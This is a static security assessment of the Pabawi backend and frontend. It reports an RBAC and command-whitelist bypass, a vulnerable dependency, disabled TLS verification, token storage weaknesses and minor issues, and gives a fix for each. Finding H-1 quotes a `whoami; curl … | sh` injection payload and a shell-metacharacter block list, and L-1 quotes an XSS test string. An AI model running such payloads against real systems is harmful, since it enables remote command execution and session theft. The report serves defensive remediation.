# Pabawi Security Assessment — 2026-07-02

**Scope:** Backend (`backend/src`) auth/RBAC, command execution, web layer, MCP; frontend token handling and output rendering; dependency and configuration review. Static source review only — no runtime/DAST testing was performed.

**Overall:** The codebase shows a strong baseline: parameterized SQL throughout, bcrypt (cost 12), JWT with `iss`/`aud` pinning and refresh-token rotation + reuse detection, helmet CSP, prototype-pollution guards, constant-time secret comparison, and `spawn(..., { shell: false })` with argv separation. The most serious issue is an **authorization + command-whitelist bypass on the batch/re-execute paths**, which lets any authenticated user run arbitrary commands on target nodes. That should be fixed before anything else.

---

## Findings

### H-1 (High) — Command-whitelist and RBAC bypass via `/api/executions/batch` and `/api/executions/:id/re-execute`

**Location:** `backend/src/server.ts` (executions mount ~L860), `backend/src/routes/executions.ts` (`/batch` L1559, `/:id/re-execute` L755), `backend/src/services/BatchExecutionService.ts` (`executeAction` L620), `backend/src/integrations/bolt/BoltPlugin.ts` (`case "command"` L224), `backend/src/integrations/bolt/BoltService.ts` (`runCommand` L749).

The single-node route `POST /api/nodes/:id/command` is properly gated by `rbacMiddleware('bolt','execute')` **and** `BoltCommandWhitelistService.validateCommand()`, which blocks shell metacharacters (`; | & ` `$() {} * ? [] ~ < > \` newlines) even in `allowAll` mode.

The `/api/executions` router is mounted with `authMiddleware` + `rateLimitMiddleware` only — **no `rbacMiddleware`**. Its `POST /batch` handler accepts `{ type: "command", action: <arbitrary string>, tool: "bolt"|"ansible"|"ssh" }` and runs it through `IntegrationManager.executeAction → BoltPlugin (case "command") → BoltService.runCommand`. That path performs **no whitelist validation** and only rejects a leading `-` (`assertNoLeadingDash`). `re-execute` has the same gap.

Consequences:
- Any authenticated user — regardless of role, including a read-only user — can execute commands on managed nodes. The `bolt:execute` permission is not enforced.
- Because Bolt runs the command in a shell **on the remote target**, shell metacharacters are interpreted remotely. A payload like `whoami; curl … | sh` submitted via `/api/executions/batch` bypasses the metacharacter filter that guards the single-node route. This is effectively remote command injection on managed infrastructure.

**Remediation:**
- Mount `/api/executions` behind `rbacMiddleware('bolt','execute')` (and per-tool checks where appropriate), matching the single-node route.
- Route all command execution through a single choke point that calls `validateCommand()` before spawning — do not let `BatchExecutionService`/`executeAction` reach `runCommand` without whitelist validation.
- Apply the same `SHELL_META_PATTERN` check inside `BoltService.runCommand` as defense-in-depth so no future callsite can bypass it.

---

### H-2 (High) — Vulnerable transitive dependency: `undici`

**Location:** `backend` dependency tree (`npm audit`).

`npm audit --omit=dev` reports one high-severity advisory chain in `undici <=6.26.0` (HTTP header injection via Set-Cookie percent-decoding, WebSocket DoS via fragment-count bypass, response-queue poisoning via keep-alive socket reuse, SameSite downgrade). `npm audit fix` reports a fix is available.

**Remediation:** Run `npm audit fix` (or bump the dependency pulling in `undici`), re-run tests, and add `npm audit` to CI so regressions are caught. Given the CLAUDE.md note that extension npm deps are bundled and not lockfile-tracked, verify any bundled copies of `undici` are also updated.

---

### M-1 (Medium) — Console WebSocket proxy disables upstream TLS verification

**Location:** `backend/src/services/ConsoleWebSocketProxy.ts` L250 — `new WebSocket(upstreamUrl, { rejectUnauthorized: false })`.

The upstream console connection is established with certificate verification disabled unconditionally, exposing the proxied console session (potentially carrying credentials/keystrokes) to MITM on the path to the upstream host.

**Remediation:** Make TLS verification the default and gate any relaxation behind an explicit, per-integration opt-in config flag (as Proxmox/PuppetDB already do), ideally with a startup warning when disabled.

---

### M-2 (Medium) — JWT access and refresh tokens stored in `localStorage`

**Location:** `frontend/src/lib/auth.svelte.ts` (L308–312, L326–330).

Access token, refresh token, and user object are persisted in `localStorage`, which is readable by any JavaScript running in the origin. Combined with the `{@html}` rendering paths (see L-1), any XSS becomes full account/session takeover, including a 7-day refresh token.

**Remediation:** Prefer `HttpOnly`, `Secure`, `SameSite` cookies for token storage so tokens are not reachable from JS. If localStorage must stay, keep the strict CSP (already present) and treat any `{@html}` sink as high-risk.

---

### M-3 (Medium) — "Revoke all user tokens" uses second-granularity `iat` comparison

**Location:** `backend/src/services/AuthenticationService.ts` — `isTokenRevoked` (L600–605), `revokeAllUserTokens` (L537).

Bulk revocation compares `decoded.iat * 1000` (JWT `iat` is second-granularity) against the revocation timestamp in milliseconds. A token minted in the same wall-clock second as the revocation can have `iat*1000 < revokedAt` fail to hold, so it may remain valid despite a "revoke all" being issued. The window is small but real for concurrent logout/revoke-then-reissue flows.

**Remediation:** Store a per-user "tokens invalid before" epoch and reject tokens with `iat <= that epoch` (inclusive), or track individual `jti`s. Avoid relying on sub-second precision from `iat`.

---

### L-1 (Low / Informational) — `{@html}` output rendering (reviewed, currently mitigated)

**Location:** `frontend/src/lib/ansiToHtml.ts` (`ansiToHtml` L94), consumers in `CommandOutput.svelte`, `RealtimeOutputViewer.svelte`, `PuppetOutputViewer.svelte`, `ExecutionsPage.svelte`.

Command/Puppet output is rendered with `{@html}`. This is currently safe: `ansiToHtml` HTML-escapes `& < > " '` **before** injecting `<span>` tags, colors come from a fixed lookup table (no user-controlled style values), and the search-highlight path uses `escapeHtml(stripAnsi(...))`. No injection was found. Flagging because it is a fragile, high-impact sink: any future edit that reorders escaping or adds a user-controlled attribute reintroduces stored XSS over attacker-influenced node output.

**Remediation:** Add a regression test asserting `ansiToHtml('<img src=x onerror=alert(1)>')` produces no live markup, and keep the escape-first ordering invariant documented at the callsites.

---

### L-2 (Low) — Stale documentation advertising deprecated `?token=` JWT-in-URL auth

**Location:** `backend/src/routes/streaming.ts` (docstring L133–134, and `/:id/stream` doc comment).

The implementation correctly resolves auth via single-use `?ticket=` in `streamAuthMiddleware` (JWT no longer accepted in the URL), but the docstrings still describe a `?token=<JWT>` fallback. Misleading docs can lead an operator or future contributor to reintroduce JWT-in-URL (which leaks tokens into access logs).

**Remediation:** Remove the `?token=` references from the docstrings to match the code.

---

### L-3 (Low) — Authenticated config endpoint echoes the command whitelist

**Location:** `backend/src/server.ts` L683 (`GET /api/config`); rate limiting skips `/api/config` in `securityMiddleware.ts` L69–72.

`GET /api/config` returns `commandWhitelist` (allowAll, matchMode, entries) and timeouts. It requires authentication, so exposure is limited, but it does hand any logged-in user the exact allow/deny policy, and it is exempt from the per-user rate limiter. Low impact; note in the context of H-1 (a user who can read the whitelist can also currently bypass it).

**Remediation:** Consider returning whitelist details only to admins, and confirm the rate-limit skip is intended.

---

## Positives worth preserving

- All reviewed SQL uses parameterized queries (`?` placeholders); interpolated fragments are fixed internal column-name constants, not user input.
- Passwords hashed with bcrypt cost 12 in production; strong password policy at setup; generic "Invalid credentials" to prevent enumeration; temporary account lockout (5 attempts / 15 min).
- JWT signed HS256 with pinned `iss`/`aud`; refresh-token rotation with reuse detection that revokes the whole token family; fail-secure revocation checks.
- Production refuses to start without a real `JWT_SECRET` (≥32 chars, placeholder strings rejected).
- Bolt spawned with `shell: false` and argv arrays; single-node command route enforces both RBAC and a metacharacter-blocking whitelist.
- `helmet` CSP (`default-src 'self'`, `object-src 'none'`, `frame-src 'none'`), prototype-pollution guard and depth limit in input sanitization, constant-time token comparison (`tokensEqual`), MCP tools gated by RBAC, OAuth flow uses state + nonce + PKCE with one-time state entries.

## Suggested priority

1. H-1 — close the batch/re-execute RBAC + whitelist bypass.
2. H-2 — `npm audit fix` and add audit to CI.
3. M-1, M-2, M-3 — TLS verification default, cookie-based token storage, revocation epoch precision.
4. L-1..L-3 — regression test for the HTML sink, doc cleanup, config exposure.
